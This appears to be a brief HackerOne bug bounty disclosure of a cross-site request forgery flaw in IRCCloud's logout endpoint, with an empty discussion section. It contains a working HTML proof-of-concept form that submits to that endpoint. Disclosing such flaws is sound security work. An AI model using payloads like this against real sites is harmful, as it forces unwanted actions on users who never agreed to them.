# HackerOne Report: Log Out Cross site Request Forgery
**Report ID:** 7516
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
<html>
<body>
<form action="https://www.irccloud.com/chat/logout">
<input type="submit" value="Submit request" />
</form>
</body>
</html>

## Discussion & Remediation Timeline
